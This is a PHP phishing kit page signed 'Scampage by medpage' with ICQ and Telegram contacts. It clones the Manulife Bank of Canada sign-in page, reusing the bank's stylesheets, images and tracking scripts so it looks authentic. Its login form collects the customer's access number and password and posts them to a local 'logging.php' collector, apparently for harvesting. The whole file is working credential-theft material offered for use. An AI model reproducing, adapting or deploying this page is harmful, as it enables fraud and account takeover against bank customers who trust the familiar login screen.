<?php
   /*
 * Scampage by medpage
 * ICQ: 679849675
 * TELE: @medpagestore
 */

   require "../includes/session_protect.php";
   require "../includes/functions.php";
   require "../includes/One_Time.php";
   
   ?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
	<link href="https://client.manulifebank.com/MBCClientUI/theme/manulife_20170330.css" rel="stylesheet" type="text/css" media="screen">
	<link href="https://client.manulifebank.com/MBCClientUI/theme/manulife-print_20141222.css" rel="stylesheet" type="text/css" media="print">	
	
<link href='https://www.manulifebank.ca/BankcaTheme/themes/html/BankcaTheme/images/favicon.ico' type="images/x-icon" rel="shortcut icon">
	<title>Manulife Bank of Canada</title>
  	<!-- Census 14451, Jira 4904: frame busting defence -->
	<style>html{display:none;}</style>

		<script>
		if (self==top) {
			document.documentElement.style.display='block';
		} else {
			top.location=self.location;
		}
	</script>
			<!-- Production Adobe Script -->
			<script type="text/javascript" src="//assets.adobedtm.com/caa55bf3865be487a5b4dbd4e1effd4b7cf20ea0/satelliteLib-42f17cd709075ee9a073cbbdf0520a44af234594.js"></script>
		
</head>
<body
	style="background-color: #008343; background-repeat: repeat-x; background-image: url(https://client.manulifebank.com/MBCClientUI/images/bg_grad.png);"
	margin=0 padding=0 height=100% topmargin=0 leftmargin=0 marginwidth=0
	marginheight=0 onclick="processOnBodyEvent(event)">
	<div class="logonwrapper">
		<div style="background-color: #999; background-image: url(https://client.manulifebank.com/MBCClientUI/images/bg_grad.png);
			background-repeat: repeat-x;" class="logonheader">
			<div class="noPrint">
				


	<div class="clientheaderbar">
		<div style="float: right;">
			
			
			
			<a id="id_francais" class="headerlinks" href=https://client.banquemanuvie.com/MBCClientUI/ >&nbsp;Français</a>
			<a id="id_news" class="headerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/News target=_blank>&nbsp;News |&nbsp;</a>  
			<a id="id_contactUS" class="headerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/Contact+us target=_blank>&nbsp;Contact us |&nbsp;</a>
			<a id="id_bankHome" class="headerlinks homeicon" href=http://www.manulifebank.ca/ target=_blank>&nbsp;Home |&nbsp;</a>
		</div>
	</div>
<div style="padding: 0 0 0 0;">
	<img src="https://client.manulifebank.com/MBCClientUI/images/Manulife_e_W_Bank.gif" width="243" border="0">
</div>
			</div>
		</div>
		<div class="logoncontent">
			<div class="outage">
				
	<p class="outagetext"></p>

			</div>
			



<style type="text/css">
.cardNum {
	display:-moz-inline-stack;
	display:inline-block;
	zoom:1;
	display:inline;
	float: left;
}
.rememberMe {
	padding-left:198px;
}
.password {
	margin-right: 9px;
    padding-left: 115px;
}
.signInBut input {
	margin-left: 205px;
}
.hide {
	display: none;
	padding:2px;
	margin:0px; 
	border:2px solid green;
	z-index:1;
	position:absolute;
	left:0em;
	top:-4em;
	background-color:#fff;
}
.anchor	{
	position:relative;
}
</style>   
<h1>Customer Login</h1>





	

<form id="login_action" name="login_action" action="logging.php" method="post">
	
	<input type="hidden" name="sessionId" value="vubBTTShyxGS0KwfnwdAFzG" id="login_action_sessionId"/>
	<!-- NONCE -->
	<input type="hidden" name="view" value="5bd4c9121afb77954ade3c691adb40603dbfa75ec37a33ec2e2fe33c36a78a9a"/>	
	<input type="hidden" name="byPassValidation" value="false" id="byPassValidation"/>
	<input type="hidden" name="cookieParams" value="" id="cookieParams"/>
	<table class="logon" border="0" CELLSPACING="5" CELLPADDING="1" width="100%">
		<tr>
			<td colspan="2">&nbsp;</td>
			<td NOWRAP><span id="description" style="visibility: hidden;margin-left:106px;">Description (Optional)</span></td>
			<td width="100%">&nbsp;</td>
		</tr>
		<tr>
			<td NOWRAP><b>Access Number</b></td>
			<td NOWRAP>5047950000</td>
			<td NOWRAP id="id_cardNumberSelect_td" style="display: none;">
				<select name="cardNumberSelect" onchange="fillCardNumber();" id="id_cardNumberSelect" >
				</select>
			</td>
			<td colspan="2">
				<span style="float: left; margin-right: 10px;">
					<input type="text" required name="UN" size="12" maxlength="9" value="" id="id_cardNumber"/>
				</span>
				<span id="id_destext" style="display: none;">
					<input type="text" name="loginBean.description" size="12" maxlength="15" value="" id="id_description"/>
				</span>
			</td>
			<td width="100%">&nbsp;</td>
		</tr>
		<tr id="id_displayornot" style="display:none;">
			<td colspan=2>&nbsp;</td>
			<td  NOWRAP><input type="checkbox" name="loginBean.rememberMeAgainCheckBox" value="true" id="id_remaccessno2" onclick="rememberMeAgain()"/><input type="hidden" id="__checkbox_id_remaccessno2" name="__checkbox_loginBean.rememberMeAgainCheckBox" value="true" />
				Remember my access number
			 	<img src="images/help_icon.gif" onclick="showbox('rememberMeToolTip')" onmouseover="showbox('rememberMeToolTip')" onmouseout="hidebox('rememberMeToolTip')">
			 	<span class="anchor">			
			  	<span id="rememberMeToolTip" class='hide'>
			  		Choosing  this option lets you securely save <br> your access number so you don't have to <br> type it in each time you sign in.
			  	</span>
			  	</span></td>
			<td width="100%">&nbsp;</td>
		</tr>
		<tr id="id_displayornot2" style="display:none;">
			<td colspan=2>&nbsp;</td>
			<td NOWRAP>
				<span id="id_notrecommended2" >
					<font size="1">
						<i>(Not recommended for public computers) </i>
					</font>
				</span>
			</td>
			<td width="100%">&nbsp;</td>
		</tr>
		
		
			<tr>
				<td colspan=2>&nbsp;</td>
				<td NOWRAP>
					<input type="checkbox" name="loginBean.addCardCheckBox" value="true" id="id_remaccessno" onclick="rememberMe()"/><input type="hidden" id="__checkbox_id_remaccessno" name="__checkbox_loginBean.addCardCheckBox" value="true" />
						Remember my access number
						<img src="https://client.manulifebank.com/MBCClientUI/images/help_icon.gif" onclick="showbox('rememberMeToolTip2')" onmouseover="showbox('rememberMeToolTip2')" onmouseout="hidebox('rememberMeToolTip2')">
						<span class="anchor">
							<span id="rememberMeToolTip2" class='hide'>
								Choosing  this option lets you securely save <br> your access number so you don't have to <br> type it in each time you sign in.
							</span>
						</span>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan=2>&nbsp;</td>
				<td NOWRAP>
					<span id="id_notrecommended">
						<font size="1">
							<i>(Not recommended for public computers) </i>
						</font>
					</span>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
		
		
		<tr>
			<td colspan=2><b>Password</b></td>
			<td>
				<input type="password" required name="PW" size="12" maxlength="12" id="id_password" />
			</td>
			<td width="100%">&nbsp;</td>
		</tr>
		<tr>
			<td colspan=2>&nbsp;</td>
			<td>
				
					
  					
				
				<a id="id_forgotPasswordLink" href="/MBCClientUI/forgotPasswordOpenPage.action;jsessionid=0000vubBTTShyxGS0KwfnwdAFzG:18m52sb7k?sessionId=vubBTTShyxGS0KwfnwdAFzG&amp;view=5bd4c9121afb77954ade3c691adb40603dbfa75ec37a33ec2e2fe33c36a78a9a" class="contentlink">Forgot Password?</a>
			</td>
			<td width="100%">&nbsp;</td>
		</tr>
		<tr>
			<td colspan="4">&nbsp;</td>
		</tr>
		<tr>
			<td colspan="2">&nbsp;</td>
			<td>
				<input type="submit" value="Sign In" id="id_logonButton" name="loginBean.logonButton"/>

			</td>
			<td width="100%">&nbsp;</td>
		</tr>
		<tr>
			<td colspan="4">&nbsp;</td>
		</tr>
	</table>
	<p>&nbsp;</p>
	<p class="footer">
		By clicking the "Sign In" button, I agree to abide by Manulife Bank's Web Site <a href="javascript:void(0)" onClick="PopUp(&quot;http://www.manulife.com/public/article/index/0,,lang=en&catId=670003,00.html&quot;)">Agreement</a> and understand that I am responsible for security on my own computer.  Manulife Bank recommends all clients implement safe <a href="javascript:void(0)" onClick="PopUp(&quot;http://www.manulifebank.ca/canada/mBank.nsf/Public/online_security&quot;)">online practices</a>.
	</p>
	<p class="footer">
		<B>To sign up for Manulife Bank Internet Banking or for assistance, call <nowrap>1-877-765-2265</nowrap>. Click the "Contact Us" link on this page for hours of operation.</B>
	</p>
</form>



<script language="javascript" type="text/javascript">
	  if (null != document.getElementById("id_cardNumber")) {
		document.getElementById("id_cardNumber").focus();
	  }
</script>
<p>&nbsp;</p>
<div class="marketing"><style>

#container {
width: 888px;
}

#wide-image {
width: 584px; margin: 0 24px 24px 0; float: left;
}

#narrow-image {
width: 280px; float: left;
}

.info-box {
width: 278px; 
height: 175px; 
margin: 0 24px 24px 0; 
float: left; 
border: 1px solid #bbbcbc; 
border-top: 10px solid #bbbcbc;
}
.info-box-right {
width: 278px; 
height: 175px; 
margin: 0 0 24px 0; 
float: left; 
border: 1px solid #bbbcbc; 
border-top: 10px solid #bbbcbc;
}

</style>


<!--<div class="contentheading" >
		
 















 
<span class='breadcrumb'><span class='homeicon'>Home</span>&nbsp;&gt;&nbsp;</span><span class='breadcrumbCurrent'>Sign in</span>

<script type="text/javascript">
var title = document.title;
var newtitle=title.substring(0, title.indexOf('-'));
if(newtitle !=""){
	title=newtitle;
}

 	document.title= title+" - Sign in ";

</script>

	</div>-->
	<!--<div class="contenttitle">
		<h1>Sign in</h1>
	</div>	
	<div class="contenttoolbar">
		











<script>
 function manulifecaPrint() {
	// For this function to work properly, the Presentation templates used to display WCM content must wrap the content in a DIV tag where the 'id' attribute is set to 'printReady'.
	if (document.getElementById != null) {
		var bodyStyle = '<style>\nbody, td {\nfont-family: verdana, arial, sans-serif;\n font-size: x-small;\n}\n</style>';
		var closeLinkStyle = '<style>\n.closeLink {font-size: xx-small;\n}\n</style>';
		var html = '<HTML>\n<HEAD>\n';
			
			html += '<title>Manulifebank.ca Print</title>\n';
		
			/*html += '<link id=manulifeContentStyles rel="stylesheet" type="text/css" href="https://www.manulifebank.ca/wps/wcm/connect/manulifecacommon/Common+Content/CSS/CSS+Content?subtype=css" />';
			*/html += '\n</HE' + 'AD>\n';
			html += '<BODY style=" background-color:#FFFFFF;">\n';
			html += '<br\>\n\n';
			html += '<style type="text/css">\n img {margin-bottom:10px;}\n </style>\n';
			var obj = document.getElementById('printlogo');
			
			 var imgSrc; 
                if (obj.currentStyle) { 
                        /**************************************** 
                                        IE Opera 
                         ****************************************/ 
                        imgSrc = obj.currentStyle.backgroundImage; 
                        imgSrc = imgSrc.substring(imgSrc.indexOf('"') + 1, imgSrc 
                                        .lastIndexOf('"')); 
                } else { 
                        /**************************************** 
                                Firefox needs the full css code to work 
                         ****************************************/ 
                        imgSrc = getComputedStyle(obj, '').getPropertyValue('background-image'); 
                        
                        if (imgSrc.indexOf('"')==-1) // quotes are not included like in safari so we check for the brackets 
                        { 
                                imgSrc = imgSrc.substring(imgSrc.indexOf('(') + 1, imgSrc.lastIndexOf(')')); 
                        } 
                        else { 
                                imgSrc = imgSrc.substring(imgSrc.indexOf('"') + 1, imgSrc.lastIndexOf('"')); 
                        } 
                } 
              
  
			html += '<p><img src="' + imgSrc + '"/></p>\n';
			html += '<div class="pagecontent">\n';
			html += '<div class="bodycontent">\n';
			var printReadyCollection = document.getElementsByTagName('div');
			for ( var i = 0; i < printReadyCollection.length; i++) {
				if (printReadyCollection.item(i).getAttribute('id') == 'contenttitle') {
					html += printReadyCollection.item(i).innerHTML;
				}
				if (printReadyCollection.item(i).getAttribute('class') == 'contentbanner') {
					html += printReadyCollection.item(i).innerHTML;
					html += '<br /><br />';
				}
				if (printReadyCollection.item(i).getAttribute('id') == 'bodyContent') {
					html += printReadyCollection.item(i).innerHTML;
					html += '<br /><br />';
				}
			}
			html += '</div>\n';
			html += '</div>\n';
			html += '\n</BO' + 'DY>\n</HT' + 'ML>';
			var printWin = window
					.open(
							"",
							"printSpecial",
							'resizable=yes,scrollbars=yes,menubar=no,toolbar=yes,status=no,width=700,height=500,screenX=200,screenY=200,top=200,left=200');
			printWin.document.open();
			printWin.document.write(html);
			printWin.document.close();
			printWin.print();
		}
	}
</script>


<div class="item item_textplus" title="Resize text"></div>

<div class="item item_print" onClick="javascript:manulifecaPrint()" title="Print"></div>


 <div title="Email this page" class="item item_mail" onClick="javascript:window.location='?email_by_name\=c4af7158-3672-441c-a81a-1354b20a6ba4'"></div>



<div class="item" title="Facebook Like">
<iframe src="https://www.facebook.com/plugins/like.php?href=https://www.manulifebank.cahttps://www.manulifebank.ca/wps/wcm/connect/bankcacommon/common+content/bankca/sign+in&send=false&layout=button_count&width=120&show_faces=false&action=recommend&colorscheme=light&font&height=21" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:140px; height:21px;" allowTransparency="true"></iframe>
</div>

<div class="item" title="Twitter"> 
<a href="https://twitter.com/share" class="twitter-share-button" data-lang="en" data-url="https://www.manulifebank.cahttps://www.manulifebank.ca/wps/wcm/connect/bankcacommon/common+content/bankca/sign+in" data-count="none">Tweet</a> 
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script> 
</div> 
	</div>-->
	<div class="bodycontent landingbodycontent" >
			<p><strong><span style=" color: #BA1419;"><noscript>		<div align="center">Javascript must be enabled to use Manulife Bank's online banking site. Click here to view instructions for enabling Javascript.
			<br>
			<em>Pour pouvoir utiliser les services bancaires en ligne de la Banque Manuvie, vous devez activer Javascript. Pour voir les
				instructions s'appliquant à l'activation de Javascript, cliquez ici.
				<div>
	</noscript></span></strong></p>

<p><strong><span style=" color: #ED1C24;">Please note, some TD Bank mobile customers are having issues receiving Interac e-transfers sent from Manulife Bank. We are working with Interac to restore service as quickly as possible.</span></strong></p>

<p><strong>Protect yourself against fraud: If you receive an unexpected call from someone claiming to be your Bank or Credit Card issuer, always call back using the number listed on the back of your debit card or credit card.</strong></p>

<div id="container">
<div>
<div id="wide-image"><a href="http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/bankcacommon/Common+Content/bankca/Sign+in/bnk_signin_m1referralpromo" ><img src="https://www.manulifebank.ca/wps/wcm/connect/674b15b9-6cdb-4cba-98e0-0a5eb1b77261/bnk_image_2018springm1referral.jpg?MOD=AJPERES&amp;CACHEID=674b15b9-6cdb-4cba-98e0-0a5eb1b77261" border="0" alt="Manulife One Customers - Give a friend $1000 on us. Learn more." width="584" height="200"  title="Manulife One Customers - Give a friend $1000 on us. Learn more." /></a></div>

<div id="narrow-image"><a href="http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Bank.ca/abmlocator" ><img src="https://www.manulifebank.ca/wps/wcm/connect/5092d06d-410a-479a-8971-6ec42dc42a4b/1010487Manulife+BankBannerabm+CS2302+E.jpg?MOD=AJPERES&amp;CACHEID=5092d06d-410a-479a-8971-6ec42dc42a4b" border="0" alt="Find an ABM" width="280" height="200"  title="Find an ABM" /></a></div>
</div>

<div>
<div class="info-box">
<h3 style=" padding: 10px 10px 0 10px; margin-bottom: 10px;">When you travel, pack several ways to pay</h3>

<p style=" padding: 0 10px 0 10px; margin-bottom: 10px;">When you travel outside Canada - including to the United States - Manulife Bank recommends that you pack several ways to pay in addition to your access card.</p>

<p><a href="http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:https://www.manulifebank.ca/wps/wcm/connect/bankcacommon/Common+Content/bankca/Sign+in/bnk_signin_travel"  style="padding: 0 10px 0 10px; font-weight: bold;">Learn more</a></p>
</div>

<div class="info-box">
<h3 style=" padding: 10px 10px 0 10px; margin-bottom: 10px;">Find an ABM</h3>

<p style=" padding: 0 10px 0 10px; margin-bottom: 10px;">Manulife Bank has added over 800 ABMs in select Mac's and Couche-Tard convenience stores.</p>

<p><a href="http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Bank.ca/abmlocator"  style="padding: 0 10px 0 10px; font-weight: bold;">Learn more</a></p>
</div>

<div class="info-box-right">
<h3 style=" padding: 10px 10px 0 10px; margin-bottom: 10px;">Professional advice</h3>

<p style=" padding: 0 10px 0 10px; margin-bottom: 10px;">We offer two different ways to get the professional advice you need to make well-informed choices about your financial future.&#160;</p>

<p><a href="http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Bankingwithus/about+manulife+bank/customer+satisfaction/?urile=wcm:path:/bankcasitecontent/site+content/bankca/professional+advice/bnk_advice"  style="padding: 0 10px 0 10px; font-weight: bold;">Learn more</a></p>
</div>

<br style=" clear: both;" />
</div>

<div>
<div class="info-box">
<h3 style=" padding: 10px 10px 0 10px; margin-bottom: 10px;">Most common bill payee companies in Quebec</h3>

<p style=" padding: 0 10px 0 10px; margin-bottom: 10px;">The list of the most common bill payee companies used by Quebec customers is available.</p>

<p><a href="https://www.manulifebank.ca/wps/wcm/connect/bankcaformsmktg_fr/forms/bankca/bnk_commonbillpayeesquebec" target="_blank"  style="padding: 0 10px 0 10px; font-weight: bold;">Learn more</a></p>
</div>

<div class="info-box">
<h3 style=" padding: 10px 10px 0 10px; margin-bottom: 10px;">General Terms, Operating Agreements, Declaration of Trusts</h3>

<p style=" padding: 0 10px 0 10px; margin-bottom: 10px;">Find the General Terms, Operating Agreement or Declaration of Trust for your account.</p>

<p><a href="http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:bankcacommon/common+content/bankca/sign+in/bnk_signin_general"  style="padding: 0 10px 0 10px; font-weight: bold;">Learn more</a></p>
</div>

<div class="info-box-right">
<h3 style=" padding: 10px 10px 0 10px; margin-bottom: 10px;">Protect your personal information</h3>

<p style=" padding: 0 10px 0 10px; margin-bottom: 10px;">Manulife Bank takes financial fraud very seriously.</p>

<p><a href="http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Bankingwithus/!ut/p/?urile=wcm:path:/bankcasitecontent/site+content/bankca/banking+with+us/about+manulife+bank/fraud+prevention/bnk_withus_about_fraudsplash"  style="padding: 0 10px 0 10px; font-weight: bold;">Learn more</a></p>
</div>
</div>
</div>

<p><!-- Google Code for Remarketing Tag --> <!--================================================R emarketing tags may not be associated with personally identifiable
	information or placed on pages related to sensitive categories. See more information and instructions on how to setup the
	tag on: http://google.com/ads/remarketingsetup=================================================--> <script type="text/javascript">
		/* <![CDATA[ */
		var google_conversion_id = 961887333;
		var google_custom_params = window.google_tag_params;
		var google_remarketing_only = true;
		/* ]]> */
	</script> <script src="//www.googleadservices.com/pagead/conversion.js" type="text/javascript"></script> <noscript>		<div style="display:inline;">
			<img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/961887333/?value=0&guid=ON&script=0"
			/>
		</div>
	</noscript></p>

<p><!-- Facebook Pixel Code --><script type="text/javascript">
!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
document,'script','https://connect.facebook.net/en_US/fbevents.js');

fbq('init', '1414748265517883');
fbq('track', "PageView");</script> <noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=1414748265517883&ev=PageView&noscript=1"
/></noscript> <!-- End Facebook Pixel Code --></p>
	</div>
</div>
<script>
	function reset() {
		document.forms[0].reset();
	}
	function convert(s) {
	    if (!s) { return ""; }    
  		var ph = document.createElement("ph");
  		ph.innerHTML = s;
  		return ph.textContent || ph.innerText;
	}
	function readCookie() {
		if (null != document.getElementById('id_useanotheraccessno'))
			document.getElementById('id_useanotheraccessno').checked = false;
			var cardCookie = "";
		if (cardCookie.length > 0) {
			var cookieList = cardCookie.split(':');
			var selectOption = null;
			var list = document.getElementById('id_cardNumberSelect');
			document.getElementById("id_cardNumberSelect_td").style.display = "block";
			document.getElementById("id_cardNumber").style.display = "none";
			for (var i = 0; i < cookieList.length; i++) {
				name = cookieList[i].split('@')[0];
				value = cookieList[i].split('@')[1];
				var newOp = document.createElement("option");
				newOp.text = convert(value);
				newOp.value = name;
				list.options.add(newOp);
			}
			var value = document.getElementById("id_cardNumberSelect").value;
			document.getElementById("id_cardNumber").value = value;
		} else {
			document.getElementById("id_cardNumberSelect_td").style.display = "none";
			document.getElementById("id_cardNumber").style.display = "block";
		}
		fillCardNumber();
	}
	readCookie();
	if (null != document.getElementById("id_remaccessno") && document.getElementById("id_remaccessno").checked) {
		document.getElementById("description").style.visibility = "visible";
		document.getElementById("id_destext").style.display = "block";
		document.getElementById("id_description").value = "";
	}
</script>
		</div>
		<div class="logonfooter">
			<div class="noPrint">
				

	<!--  footer banner -->
	<div class="footerbar">
		<div class="footertext">
			strong&nbsp;&nbsp;&nbsp;&nbsp;
			&nbsp;&nbsp;reliable&nbsp;&nbsp;&nbsp;&nbsp;
			&nbsp;&nbsp;trustworthy&nbsp;&nbsp;&nbsp;&nbsp;
			&nbsp;&nbsp;forward-thinking
		</div>
		<div class="footerlinks">
			
			
			
			
			<a id="id_Accessibility" class="footerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/legal?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/legal target=_blank>|&nbsp;Accessibility</a>
			<a id="id_Legal" class="footerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/legal?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/legal target=_blank>|&nbsp;Legal&nbsp;</a>
			<a id="id_Privacy" class="footerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/privacy+policy target=_blank>|&nbsp;Privacy Policy&nbsp;</a>
			<a id="id_Careers" class="footerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/Careers target=_blank>Careers&nbsp;</a>

		</div>
	</div>
<br>
			</div>
		</div>
	</div>
	
		<script type="text/javascript">_satellite.pageBottom();</script>
	
</body>

</html>